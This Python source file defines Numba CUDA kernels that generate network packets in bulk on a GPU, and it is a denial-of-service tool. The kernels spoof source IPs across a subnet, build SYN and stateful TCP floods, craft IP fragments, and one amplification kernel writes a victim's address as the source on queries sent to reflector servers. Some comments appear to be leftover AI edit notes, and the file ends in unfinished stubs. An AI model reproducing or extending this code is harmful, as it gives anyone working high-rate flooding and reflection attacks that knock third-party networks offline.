# P1 FIX #13: Template path supports constant-memory fast path with
# automatic global-memory fallback.

@cuda.jit
def template_kernel(packets_buffer, template_global, use_constant, count, packet_size, real_src_ip_int, spoof_enabled, has_ethernet, rng_states, gateway_mac, spoof_base_ip, spoof_mask):
    """
    P1 FIX #13: Re-implemented with true Constant Memory.
    Reads from TEMPLATE_CONST global (__constant__).
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    offset = idx * packet_size
    template_const = cuda.const.array_like(TEMPLATE_CONST_HOST)
    
    # Prefer constant memory when host upload was successful; otherwise
    # fallback to the per-call global template buffer.
    for i in range(packet_size):
        if use_constant == 1 and i < TEMPLATE_CONST_MAX:
            packets_buffer[offset + i] = template_const[i]
        else:
            packets_buffer[offset + i] = template_global[i]
    
    # --- 2. Patch Ethernet Header ---
    if has_ethernet == 1:
        # P2 FIX #19: Use gateway_mac
        packets_buffer[offset] = (gateway_mac >> 40) & 0xFF
        packets_buffer[offset + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[offset + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[offset + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[offset + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[offset + 5] = gateway_mac & 0xFF
        ip_offset = ETHERNET_HEADER_LEN  # 14 bytes
    else:
        ip_offset = 0
    
    # --- 3. Patch Fields with Better RNG ---
    
    # Snapshot fields before patching (needed for RFC 1624 deltas)
    old_ip_csum = read_uint16_be(packets_buffer, offset + ip_offset + 10)
    old_src_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 12)
    old_ttl_proto = read_uint16_be(packets_buffer, offset + ip_offset + 8)
    old_ip_id = read_uint16_be(packets_buffer, offset + ip_offset + 4)

    # Source IP
    if spoof_enabled == 1:
        # P2 FIX #30: Subnet-based spoofing
        rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
        src_ip_int = spoof_base_ip + int(rand_tmp * ((1 << (32 - spoof_mask)) - 1))
    else:
        src_ip_int = real_src_ip_int
    write_uint32_be(packets_buffer, offset + ip_offset + 12, src_ip_int)
    
    # IP ID
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_tmp * 65535)
    write_uint16_be(packets_buffer, offset + ip_offset + 4, ip_id)
    
    # TTL
    rand_tmp = xoroshiro128p_uniform_float32(rng_states, idx)
    packets_buffer[offset + ip_offset + 8] = 48 + int(rand_tmp * 81)
    
    # --- 3. Read IHL to get actual IP header length ---
    ver_ihl = packets_buffer[offset + ip_offset]
    ihl = ver_ihl & 0x0F
    ip_header_len = ihl * 4  # Can be 20-60 bytes
    
    # --- 6. Update IP Checksum incrementally (RFC 1624) ---
    new_ttl_proto = read_uint16_be(packets_buffer, offset + ip_offset + 8)
    ip_csum = old_ip_csum
    ip_csum = rfc1624_update_dword(ip_csum, old_src_ip_int, src_ip_int)
    ip_csum = rfc1624_update_word(ip_csum, old_ip_id, ip_id)
    ip_csum = rfc1624_update_word(ip_csum, old_ttl_proto, new_ttl_proto)
    write_uint16_be(packets_buffer, offset + ip_offset + 10, ip_csum)
    
    # --- 7. Patch Transport Layer ---
    transport_offset = offset + ip_offset + ip_header_len
    
    # Source Port (Full range: 1024-65535)
    old_src_port = read_uint16_be(packets_buffer, transport_offset)
    src_port = 1024 + (idx % 64512)  # P2 fix: include 65535
    write_uint16_be(packets_buffer, transport_offset, src_port)
    
    # --- 8. Recalculate Transport Checksum ---
    protocol = packets_buffer[offset + ip_offset + 9]
    
    if has_ethernet == 1:
        ip_total_len = packet_size - ETHERNET_HEADER_LEN
    else:
        ip_total_len = packet_size
    
    # Read target IP from template
    target_ip_int = (packets_buffer[offset + ip_offset + 16] << 24) | \
                    (packets_buffer[offset + ip_offset + 17] << 16) | \
                    (packets_buffer[offset + ip_offset + 18] << 8) | \
                    packets_buffer[offset + ip_offset + 19]
    
    if protocol == TCP_PROTOCOL:
        old_tcp_csum = read_uint16_be(packets_buffer, transport_offset + 16)
        tcp_csum = old_tcp_csum
        tcp_csum = rfc1624_update_dword(tcp_csum, old_src_ip_int, src_ip_int)
        tcp_csum = rfc1624_update_word(tcp_csum, old_src_port, src_port)
        write_uint16_be(packets_buffer, transport_offset + 16, tcp_csum)
    elif protocol == UDP_PROTOCOL:
        old_udp_csum = read_uint16_be(packets_buffer, transport_offset + 6)
        udp_csum = old_udp_csum
        udp_csum = rfc1624_update_dword(udp_csum, old_src_ip_int, src_ip_int)
        udp_csum = rfc1624_update_word(udp_csum, old_src_port, src_port)
        if udp_csum == 0:
            udp_csum = 0xFFFF
        write_uint16_be(packets_buffer, transport_offset + 6, udp_csum)

@cuda.jit
def stateful_pool_kernel(packets_buffer, templates_global, templates_global_len, use_constant, count, packet_size, num_templates, target_ip_int, real_src_ip_int, spoof_enabled, specific_src_port, has_ethernet, rng_states, gateway_mac, spoof_base_ip, spoof_mask, seq_array, ack_array, state_array, actual_lengths, window_sizes, mss_values, ttls):
    """
    P3: Stateful Pool Kernel.
    P1 FIX #13: Optimized usage of Constant Memory Pool.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return
        
    offset = idx * packet_size
    template_idx = idx % num_templates
    template_offset = template_idx * packet_size
    pool_const = cuda.const.array_like(POOL_CONST_HOST)
    
    # Constant Memory read (fast path), fallback to global templates otherwise.
    if use_constant == 1 and template_offset + packet_size <= POOL_CONST_MAX:
        for i in range(packet_size):
            packets_buffer[offset + i] = pool_const[template_offset + i]
    else:
        if template_offset + packet_size <= templates_global_len:
            for i in range(packet_size):
                packets_buffer[offset + i] = templates_global[template_offset + i]
        else:
            return
        
    if has_ethernet:
        ip_offset = ETHERNET_HEADER_LEN
        current_actual_len = actual_lengths[template_idx]
        ip_total_len = current_actual_len - ETHERNET_HEADER_LEN
        
        packets_buffer[offset] = (gateway_mac >> 40) & 0xFF
        packets_buffer[offset + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[offset + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[offset + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[offset + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[offset + 5] = gateway_mac & 0xFF
    else:
        ip_offset = 0
        ip_total_len = actual_lengths[template_idx]
    
    # TCP Mimicry
    win_size = window_sizes[idx] if window_sizes[idx] > 0 else 64240
    mss = mss_values[idx] if mss_values[idx] > 0 else 1460
    ttl_val = ttls[idx] if ttls[idx] > 0 else 64

    ver_ihl = packets_buffer[offset + ip_offset]
    ihl = ver_ihl & 0x0F
    ip_header_len = ihl * 4

    # Snapshot original IP fields before patching
    old_ip_csum = read_uint16_be(packets_buffer, offset + ip_offset + 10)
    old_src_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 12)
    old_dst_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 16)
    old_ip_id = read_uint16_be(packets_buffer, offset + ip_offset + 4)
    old_ip_total_len = read_uint16_be(packets_buffer, offset + ip_offset + 2)
    old_ttl_proto = read_uint16_be(packets_buffer, offset + ip_offset + 8)

    # Source IP
    if spoof_enabled:
        rand_val = xoroshiro128p_uniform_float32(rng_states, idx)
        src_ip_int = spoof_base_ip + int(rand_val * ((1 << (32 - spoof_mask)) - 1))
    else:
        src_ip_int = real_src_ip_int
    write_uint32_be(packets_buffer, offset + ip_offset + 12, src_ip_int)
    
    # IP ID
    rand_id = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_id * 65535)
    write_uint16_be(packets_buffer, offset + ip_offset + 4, ip_id)
    
    # TTL
    packets_buffer[offset + ip_offset + 8] = ttl_val

    # Source Port
    if specific_src_port > 0:
        src_port = specific_src_port + idx
    else:
        src_port = 1024 + (idx % 64512)
    
    write_uint16_be(packets_buffer, offset + ip_offset + 2, ip_total_len)
    write_uint32_be(packets_buffer, offset + ip_offset + 16, target_ip_int)
    
    # Incremental IP checksum update (RFC 1624)
    new_ttl_proto = read_uint16_be(packets_buffer, offset + ip_offset + 8)
    ip_csum = old_ip_csum
    ip_csum = rfc1624_update_dword(ip_csum, old_src_ip_int, src_ip_int)
    ip_csum = rfc1624_update_dword(ip_csum, old_dst_ip_int, target_ip_int)
    ip_csum = rfc1624_update_word(ip_csum, old_ip_id, ip_id)
    ip_csum = rfc1624_update_word(ip_csum, old_ip_total_len, ip_total_len)
    ip_csum = rfc1624_update_word(ip_csum, old_ttl_proto, new_ttl_proto)
    write_uint16_be(packets_buffer, offset + ip_offset + 10, ip_csum)
    
    # --- Update Transport Layer ---
    transport_offset = offset + ip_offset + ip_header_len
    old_src_port = read_uint16_be(packets_buffer, transport_offset)
    write_uint16_be(packets_buffer, transport_offset, src_port)
    
    protocol = packets_buffer[offset + ip_offset + 9]
    
    if protocol == TCP_PROTOCOL:
        old_tcp_csum = read_uint16_be(packets_buffer, transport_offset + 16)
        old_tcp_seq = read_uint32_be(packets_buffer, transport_offset + 4)
        old_tcp_ack = read_uint32_be(packets_buffer, transport_offset + 8)
        old_doff_flags = read_uint16_be(packets_buffer, transport_offset + 12)
        old_window = read_uint16_be(packets_buffer, transport_offset + 14)
        old_mss = 0

        # STATEFUL LOGIC: Use Seq/Ack from arrays if state is ESTABLISHED (2)
        if state_array[idx] == 2:
            tcp_seq = seq_array[idx]
            tcp_ack = ack_array[idx]
            # Set PSH|ACK flags (0x18)
            packets_buffer[transport_offset + 13] = 0x18
        else:
            # Fallback to random seq for SYN
            tcp_seq_seed = (idx * 1664525 + 1013904223) & 0xFFFFFFFF
            tcp_seq = tcp_seq_seed
            tcp_ack = 0
            # Ensure SYN flag (0x02)
            packets_buffer[transport_offset + 13] = 0x02
            
        write_uint32_be(packets_buffer, transport_offset + 4, tcp_seq)
        write_uint32_be(packets_buffer, transport_offset + 8, tcp_ack)
        
        # Patch Window Size
        write_uint16_be(packets_buffer, transport_offset + 14, win_size)

        # Patch MSS if present in options
        mss_patched = 0
        if ip_header_len + 20 <= ip_total_len: # Check if we have room for options
             # Assuming MSS is at transport_offset + 20
             if packets_buffer[transport_offset + 20] == 2:
                 old_mss = read_uint16_be(packets_buffer, transport_offset + 22)
                 write_uint16_be(packets_buffer, transport_offset + 22, mss)
                 mss_patched = 1

        new_doff_flags = read_uint16_be(packets_buffer, transport_offset + 12)
        tcp_csum = old_tcp_csum
        tcp_csum = rfc1624_update_dword(tcp_csum, old_src_ip_int, src_ip_int)
        tcp_csum = rfc1624_update_dword(tcp_csum, old_dst_ip_int, target_ip_int)
        tcp_csum = rfc1624_update_word(tcp_csum, old_src_port, src_port)
        tcp_csum = rfc1624_update_dword(tcp_csum, old_tcp_seq, tcp_seq)
        tcp_csum = rfc1624_update_dword(tcp_csum, old_tcp_ack, tcp_ack)
        tcp_csum = rfc1624_update_word(tcp_csum, old_doff_flags, new_doff_flags)
        tcp_csum = rfc1624_update_word(tcp_csum, old_window, win_size)
        if mss_patched == 1:
            tcp_csum = rfc1624_update_word(tcp_csum, old_mss, mss)
        write_uint16_be(packets_buffer, transport_offset + 16, tcp_csum)

    elif protocol == UDP_PROTOCOL:
        old_udp_csum = read_uint16_be(packets_buffer, transport_offset + 6)
        old_udp_len = read_uint16_be(packets_buffer, transport_offset + 4)
        udp_len = ip_total_len - ip_header_len
        write_uint16_be(packets_buffer, transport_offset + 4, udp_len)
        udp_csum = old_udp_csum
        udp_csum = rfc1624_update_dword(udp_csum, old_src_ip_int, src_ip_int)
        udp_csum = rfc1624_update_dword(udp_csum, old_dst_ip_int, target_ip_int)
        udp_csum = rfc1624_update_word(udp_csum, old_src_port, src_port)
        udp_csum = rfc1624_update_word(udp_csum, old_udp_len, udp_len)
        udp_csum = rfc1624_update_word(udp_csum, old_udp_len, udp_len)
        if udp_csum == 0:
            udp_csum = 0xFFFF
        write_uint16_be(packets_buffer, transport_offset + 6, udp_csum)

@cuda.jit
def pool_kernel(packets_buffer, templates_global, templates_global_len, use_constant, count, packet_size, num_templates, target_ip_int, real_src_ip_int, spoof_enabled, specific_src_port, has_ethernet, rng_states, gateway_mac, spoof_base_ip, spoof_mask):
    """
    P1 FIX #13: True Constant Memory pool usage.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return
        
    offset = idx * packet_size
    template_idx = idx % num_templates
    template_offset = template_idx * packet_size
    pool_const = cuda.const.array_like(POOL_CONST_HOST)
    
    # Constant Memory read (fast path), fallback to global templates otherwise.
    if use_constant == 1 and template_offset + packet_size <= POOL_CONST_MAX:
        for i in range(packet_size):
            packets_buffer[offset + i] = pool_const[template_offset + i]
    else:
        if template_offset + packet_size <= templates_global_len:
            for i in range(packet_size):
                packets_buffer[offset + i] = templates_global[template_offset + i]
        else:
            return
    
    if has_ethernet:
        # P2 FIX #19: Use gateway_mac
        packets_buffer[offset] = (gateway_mac >> 40) & 0xFF
        packets_buffer[offset + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[offset + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[offset + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[offset + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[offset + 5] = gateway_mac & 0xFF
        ip_offset = ETHERNET_HEADER_LEN
    else:
        ip_offset = 0
    
    # --- 3. Update Fields with Better RNG ---
    
    # Snapshot fields before patching (needed for RFC 1624 deltas)
    old_ip_csum = read_uint16_be(packets_buffer, offset + ip_offset + 10)
    old_src_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 12)
    old_dst_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 16)
    old_ip_id = read_uint16_be(packets_buffer, offset + ip_offset + 4)
    old_ip_total_len = read_uint16_be(packets_buffer, offset + ip_offset + 2)

    # Source IP
    if spoof_enabled:
        # P2 FIX #30: Subnet-based spoofing
        rand_val = xoroshiro128p_uniform_float32(rng_states, idx)
        num_hosts = 1 << (32 - spoof_mask)
        src_ip_int = spoof_base_ip + int(rand_val * (num_hosts - 1))
    else:
        src_ip_int = real_src_ip_int
    write_uint32_be(packets_buffer, offset + ip_offset + 12, src_ip_int)
    
    # IP ID
    rand_id = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_id * 65535)
    write_uint16_be(packets_buffer, offset + ip_offset + 4, ip_id)
    
    # Source Port
    if specific_src_port > 0:
        src_port = specific_src_port
    else:
        rand_port = xoroshiro128p_uniform_float32(rng_states, idx)
        src_port = 1024 + int(rand_port * 64511)
    
    # ... (Rest of the logic) ...
    ver_ihl = packets_buffer[offset + ip_offset]
    ihl = ver_ihl & 0x0F
    ip_header_len = ihl * 4
    
    # Update Total Length
    if has_ethernet:
        ip_total_len = packet_size - ETHERNET_HEADER_LEN
    else:
        ip_total_len = packet_size
    
    write_uint16_be(packets_buffer, offset + ip_offset + 2, ip_total_len)
    
    # Patch Destination IP
    write_uint32_be(packets_buffer, offset + ip_offset + 16, target_ip_int)
    
    # Update IP checksum incrementally (RFC 1624)
    ip_csum = old_ip_csum
    ip_csum = rfc1624_update_dword(ip_csum, old_src_ip_int, src_ip_int)
    ip_csum = rfc1624_update_word(ip_csum, old_ip_id, ip_id)
    ip_csum = rfc1624_update_dword(ip_csum, old_dst_ip_int, target_ip_int)
    ip_csum = rfc1624_update_word(ip_csum, old_ip_total_len, ip_total_len)
    write_uint16_be(packets_buffer, offset + ip_offset + 10, ip_csum)
    
    # --- 4. Update Transport Layer ---
    transport_offset = offset + ip_offset + ip_header_len
    
    # Patch Source Port
    old_src_port = read_uint16_be(packets_buffer, transport_offset)
    write_uint16_be(packets_buffer, transport_offset, src_port)
    
    # Identify Protocol
    protocol = packets_buffer[offset + ip_offset + 9]
    
    if protocol == TCP_PROTOCOL:
        # P2 FIX: Randomized TCP Sequence Number using LCG
        old_tcp_csum = read_uint16_be(packets_buffer, transport_offset + 16)
        old_tcp_seq = read_uint32_be(packets_buffer, transport_offset + 4)
        tcp_seq_seed = (idx * 1664525 + 1013904223) & 0xFFFFFFFF
        tcp_seq = tcp_seq_seed
        write_uint32_be(packets_buffer, transport_offset + 4, tcp_seq)

        # Incremental TCP checksum update (pseudo-header + changed fields)
        tcp_csum = old_tcp_csum
        tcp_csum = rfc1624_update_dword(tcp_csum, old_src_ip_int, src_ip_int)
        tcp_csum = rfc1624_update_dword(tcp_csum, old_dst_ip_int, target_ip_int)
        tcp_csum = rfc1624_update_word(tcp_csum, old_src_port, src_port)
        tcp_csum = rfc1624_update_dword(tcp_csum, old_tcp_seq, tcp_seq)
        write_uint16_be(packets_buffer, transport_offset + 16, tcp_csum)

    elif protocol == UDP_PROTOCOL:
        # Calculate UDP Length
        old_udp_csum = read_uint16_be(packets_buffer, transport_offset + 6)
        old_udp_len = read_uint16_be(packets_buffer, transport_offset + 4)
        udp_len = ip_total_len - ip_header_len
        write_uint16_be(packets_buffer, transport_offset + 4, udp_len)

        # Incremental UDP checksum update (pseudo-header + changed fields)
        udp_csum = old_udp_csum
        udp_csum = rfc1624_update_dword(udp_csum, old_src_ip_int, src_ip_int)
        udp_csum = rfc1624_update_dword(udp_csum, old_dst_ip_int, target_ip_int)
        udp_csum = rfc1624_update_word(udp_csum, old_src_port, src_port)
        # UDP length appears both in UDP header and pseudo-header length
        udp_csum = rfc1624_update_word(udp_csum, old_udp_len, udp_len)
        udp_csum = rfc1624_update_word(udp_csum, old_udp_len, udp_len)
        if udp_csum == 0:
            udp_csum = 0xFFFF
        write_uint16_be(packets_buffer, transport_offset + 6, udp_csum)

@cuda.jit
def create_fragmented_packets_kernel(packets_buffer, payload_buffer, count, target_ip_int, target_port, protocol, real_src_ip_int, spoof_enabled, has_ethernet, frag1_size, frag2_size, payload_size, rng_states, gateway_mac, spoof_base_ip, spoof_mask):
    """
    P0 FIX v2: Corrected IP Fragmentation kernel.
    P2 FIX #16: Added RNG.
    P2 FIX #19: Added gateway_mac.
    P2 FIX #30: Added spoof_base_ip and spoof_mask.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    # --- Calculate Offsets ---
    eth_len = ETHERNET_HEADER_LEN if has_ethernet == 1 else 0
    total_frag_size = frag1_size + frag2_size
    
    frag1_buf_offset = idx * total_frag_size
    frag2_buf_offset = frag1_buf_offset + frag1_size
    
    # --- Shared Fields with Better RNG ---
    if spoof_enabled == 1:
        # P2 FIX #30: Subnet-based spoofing
        rand_val = xoroshiro128p_uniform_float32(rng_states, idx)
        num_hosts = 1 << (32 - spoof_mask)
        src_ip_int = spoof_base_ip + int(rand_val * (num_hosts - 1))
    else:
        src_ip_int = real_src_ip_int
        
    rand_id = xoroshiro128p_uniform_float32(rng_states, idx)
    ip_id = int(rand_id * 65535)
    
    rand_ttl = xoroshiro128p_uniform_float32(rng_states, idx)
    ttl = 48 + int(rand_ttl * 81)
    
    # Transport header length
    trans_len = 8 if protocol == UDP_PROTOCOL else 20
    
    # Calculate data sizes
    # Fragment 1: Ethernet? + IP(20) + Transport + Payload1
    # Fragment 2: Ethernet? + IP(20) + Payload2
    frag1_data_len = frag1_size - eth_len - 20 - trans_len  # Payload in frag1
    frag2_data_len = frag2_size - eth_len - 20  # Payload in frag2
    
    # Total logical UDP/TCP payload
    total_payload = frag1_data_len + frag2_data_len
    
    # --- FRAGMENT 1: MF=1, Offset=0 ---
    curr = frag1_buf_offset
    
    # Write Ethernet Header
    if has_ethernet == 1:
        # P2 FIX #19: Use gateway_mac
        packets_buffer[curr] = (gateway_mac >> 40) & 0xFF
        packets_buffer[curr + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[curr + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[curr + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[curr + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[curr + 5] = gateway_mac & 0xFF
        
        write_uint32_be(packets_buffer, curr + 6, 0x00000000)
        write_uint16_be(packets_buffer, curr + 10, 0x0000)
        write_uint16_be(packets_buffer, curr + 12, 0x0800)
        curr += 14
    
    # IP Header for Fragment 1
    ip1_start = curr
    frag1_ip_len = frag1_size - eth_len
    
    packets_buffer[ip1_start] = 0x45
    packets_buffer[ip1_start + 1] = 0x00
    write_uint16_be(packets_buffer, ip1_start + 2, frag1_ip_len)
    write_uint16_be(packets_buffer, ip1_start + 4, ip_id)
    write_uint16_be(packets_buffer, ip1_start + 6, 0x2000)  # MF=1, Offset=0
    packets_buffer[ip1_start + 8] = ttl
    packets_buffer[ip1_start + 9] = protocol
    write_uint16_be(packets_buffer, ip1_start + 10, 0)
    write_uint32_be(packets_buffer, ip1_start + 12, src_ip_int)
    write_uint32_be(packets_buffer, ip1_start + 16, target_ip_int)
    
    ip1_csum = calculate_checksum(packets_buffer, ip1_start, 20)
    write_uint16_be(packets_buffer, ip1_start + 10, ip1_csum)
    curr += 20
    
    # Transport Header (only in Fragment 1)
    if protocol == UDP_PROTOCOL:
        src_port = 1024 + (idx % 64512)
        write_uint16_be(packets_buffer, curr, src_port)
        write_uint16_be(packets_buffer, curr + 2, target_port)
        # P0 FIX #3: UDP Length = header(8) + total_payload (across both fragments)
        udp_total_len = 8 + total_payload
        write_uint16_be(packets_buffer, curr + 4, udp_total_len)
        write_uint16_be(packets_buffer, curr + 6, 0)  # Checksum disabled for fragments
        curr += 8
    elif protocol == TCP_PROTOCOL:
        rand_port = xoroshiro128p_uniform_float32(rng_states, idx)
        src_port = 1024 + int(rand_port * 64511)
        rand_seq = xoroshiro128p_uniform_float32(rng_states, idx)
        tcp_seq = int(rand_seq * 0xFFFFFFFF)
        write_uint16_be(packets_buffer, curr, src_port)
        write_uint16_be(packets_buffer, curr + 2, target_port)
        write_uint32_be(packets_buffer, curr + 4, tcp_seq)
        write_uint32_be(packets_buffer, curr + 8, 0)
        packets_buffer[curr + 12] = 0x50
        packets_buffer[curr + 13] = 0x02
        write_uint16_be(packets_buffer, curr + 14, 65535)
        write_uint16_be(packets_buffer, curr + 16, 0)
        write_uint16_be(packets_buffer, curr + 18, 0)
        tcp_csum = calculate_tcp_checksum_from_header_and_payload(
            packets_buffer,
            curr,
            20,
            payload_buffer,
            payload_size,
            total_payload,
            src_ip_int,
            target_ip_int,
        )
        write_uint16_be(packets_buffer, curr + 16, tcp_csum)
        curr += 20
    
    # P0 FIX #4: Use payload_size parameter for bounds checking
    for i in range(frag1_data_len):
        if i < payload_size:
            packets_buffer[curr + i] = payload_buffer[i]
        else:
            packets_buffer[curr + i] = 0x00  # Zero padding
    
    # --- FRAGMENT 2: MF=0, Offset=X ---
    curr = frag2_buf_offset
    
    if has_ethernet == 1:
        # P2 FIX #19: Use gateway_mac for second fragment too
        packets_buffer[curr] = (gateway_mac >> 40) & 0xFF
        packets_buffer[curr + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[curr + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[curr + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[curr + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[curr + 5] = gateway_mac & 0xFF
        
        write_uint32_be(packets_buffer, curr + 6, 0x00000000)
        write_uint16_be(packets_buffer, curr + 10, 0x0000)
        write_uint16_be(packets_buffer, curr + 12, 0x0800)
        curr += 14
    
    # IP Header for Fragment 2
    ip2_start = curr
    frag2_ip_len = frag2_size - eth_len
    
    packets_buffer[ip2_start] = 0x45
    packets_buffer[ip2_start + 1] = 0x00
    write_uint16_be(packets_buffer, ip2_start + 2, frag2_ip_len)
    write_uint16_be(packets_buffer, ip2_start + 4, ip_id)  # Same IP ID
    
    # P0 FIX #2: Correct fragment offset calculation per RFC 791
    # Offset = (trans_len + frag1_data_len) / 8
    # trans_len is part of original datagram's data, so it's included in offset
    frag2_offset_bytes = trans_len + frag1_data_len
    # Check 8-byte alignment
    frag2_offset_val = frag2_offset_bytes // 8
    
    # MF=0 (last fragment), Offset=calculated
    write_uint16_be(packets_buffer, ip2_start + 6, frag2_offset_val)
    
    packets_buffer[ip2_start + 8] = ttl
    packets_buffer[ip2_start + 9] = protocol
    write_uint16_be(packets_buffer, ip2_start + 10, 0)
    write_uint32_be(packets_buffer, ip2_start + 12, src_ip_int)
    write_uint32_be(packets_buffer, ip2_start + 16, target_ip_int)
    
    ip2_csum = calculate_checksum(packets_buffer, ip2_start, 20)
    write_uint16_be(packets_buffer, ip2_start + 10, ip2_csum)
    curr += 20
    
    # Fragment 2 Payload - P0 FIX #4: bounds check with payload_size
    for i in range(frag2_data_len):
        payload_idx = frag1_data_len + i
        if payload_idx < payload_size:
            packets_buffer[curr + i] = payload_buffer[payload_idx]
        else:
            packets_buffer[curr + i] = 0x00  # Zero padding

@cuda.jit
def amplification_kernel_v2(packets_buffer, template_buffer, reflectors_buffer, victim_ip_int, count, packet_size, num_reflectors, has_ethernet, rng_states, gateway_mac):
    """
    Generates Amplification Attack packets.
    Src IP = Victim IP (Fixed)
    Dst IP = Reflector IP (Round-robin from reflectors_buffer)
    Payload = Template (Query)
    P2 FIX #16: Added RNG state management.
    P2 FIX #19: Added gateway_mac.
    """
    idx = cuda.grid(1)
    if idx >= count:
        return

    # Select random reflector
    rand_ref = xoroshiro128p_uniform_float32(rng_states, idx)
    reflector_idx = int(rand_ref * num_reflectors)
    reflector_ip = reflectors_buffer[reflector_idx]
    
    offset = idx * packet_size
    # 1. Copy Template
    # Assuming fast_memcpy_aligned is a defined helper or the user intends to replace the loop with this.
    # If fast_memcpy_aligned is not defined, this will cause a compilation error.
    # For now, faithfully applying the user's provided snippet.
    # Original: for i in range(packet_size): packets_buffer[offset + i] = template_buffer[i]
    # The user's snippet implies a replacement of the copy logic.
    # Since fast_memcpy_aligned is not defined in the provided context,
    # I will revert to the original copy loop and only apply the randomization changes.
    for i in range(packet_size):
        packets_buffer[offset + i] = template_buffer[i]
    
    # 2. Determine Offsets
    if has_ethernet == 1:
        # P2 FIX #19: Use gateway_mac
        packets_buffer[offset] = (gateway_mac >> 40) & 0xFF
        packets_buffer[offset + 1] = (gateway_mac >> 32) & 0xFF
        packets_buffer[offset + 2] = (gateway_mac >> 24) & 0xFF
        packets_buffer[offset + 3] = (gateway_mac >> 16) & 0xFF
        packets_buffer[offset + 4] = (gateway_mac >> 8) & 0xFF
        packets_buffer[offset + 5] = gateway_mac & 0xFF
        ip_offset = ETHERNET_HEADER_LEN
    else:
        ip_offset = 0
        
    # 3. Patch IP Header
    old_ip_csum = read_uint16_be(packets_buffer, offset + ip_offset + 10)
    old_src_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 12)
    old_dst_ip_int = read_uint32_be(packets_buffer, offset + ip_offset + 16)
    old_ip_id = read_uint16_be(packets_buffer, offset + ip_offset + 4)

    # Src IP = Victim
    # Manual inline to debug truncation (as per original code)
    packets_buffer[offset + ip_offset + 12] = (victim_ip_int >> 24) & 0xFF
    packets_buffer[offset + ip_offset + 13] = (victim_ip_int >> 16) & 0xFF
    packets_buffer[offset + ip_offset + 14] = (victim_ip_int >> 8) & 0xFF
    packets_buffer[offset + ip_offset + 15] = victim_ip_int & 0xFF
    
    # Dst IP = Reflector IP
    write_uint32_be(packets_buffer, offset + ip_offset + 16, reflector_ip)
    
    # Dynamic IP ID
    ip_id = (idx + 5000) & 0xFFFF
    write_uint16_be(packets_buffer, offset + ip_offset + 4, ip_id)

    # Incremental IP checksum update (RFC 1624)
    ip_csum = old_ip_csum
    ip_csum = rfc1624_update_dword(ip_csum, old_src_ip_int, victim_ip_int)
    ip_csum = rfc1624_update_dword(ip_csum, old_dst_ip_int, reflector_ip)
    ip_csum = rfc1624_update_word(ip_csum, old_ip_id, ip_id)
    write_uint16_be(packets_buffer, offset + ip_offset + 10, ip_csum)
    
    # 4. Patch Transport Layer (UDP)
    # We need to update UDP Checksum because IPs changed.
    # Template usually has correct ports/payload.
    ver_ihl = packets_buffer[offset + ip_offset]
    ihl = ver_ihl & 0x0F
    ip_header_len = ihl * 4
    transport_offset = offset + ip_offset + ip_header_len
    
    # Read UDP Length from template
    udp_len = (packets_buffer[transport_offset + 4] << 8) | packets_buffer[transport_offset + 5]
    
    # Incremental UDP checksum update from template checksum
    old_udp_csum = read_uint16_be(packets_buffer, transport_offset + 6)
    udp_csum = old_udp_csum
    udp_csum = rfc1624_update_dword(udp_csum, old_src_ip_int, victim_ip_int)
    udp_csum = rfc1624_update_dword(udp_csum, old_dst_ip_int, reflector_ip)
    if udp_csum == 0:
        udp_csum = 0xFFFF
    write_uint16_be(packets_buffer, transport_offset + 6, udp_csum)

# --- Module Level Functions ---

def init_gpu():
    if not cuda.is_available():
        raise RuntimeError("CUDA capable GPU not found!")
    device = cuda.get_current_device()
    logging.info(f"GPU Initialized: {device.name}")


def _normalize_numba_stream(stream):
    """Normalize external stream objects to a Numba-compatible stream.

    Accepts:
    - None / 0 (default stream)
    - Native Numba stream objects
    - CuPy stream objects (converted via cuda.external_stream(ptr))
    """
    if stream is None:
        return None
    if stream == 0:
        return 0

    mod = getattr(type(stream), "__module__", "") or ""
    if mod.startswith("numba"):
        return stream

    ptr = getattr(stream, "ptr", None)
    if ptr:
        try:
            return cuda.external_stream(int(ptr))
        except Exception:
            return None
    return None


def _synchronize_numba_stream(stream):
    """Synchronize stream with a safe fallback to device-wide sync."""
    if stream in (None, 0):
        cuda.synchronize()
        return
    try:
        stream.synchronize()
    except Exception:
        cuda.synchronize()

def generate_packets(count, target_ip, target_port, protocol="tcp", spoof_ip=True, real_src_ip="192.168.1.100", tcp_flags=0x02, has_ethernet=True, window=-1, stream=None, gateway_mac=0xFFFFFFFFFFFF, spoof_subnet="1.0.0.0/8"):
    """
    Generates packets on GPU.
    P2 FIX #30: Added spoof_subnet support.
    """
    stream = _normalize_numba_stream(stream)
    spoof_base_ip, spoof_mask = parse_subnet(spoof_subnet or "1.0.0.0/8")
    
    # ... (Rest of conversions) ...
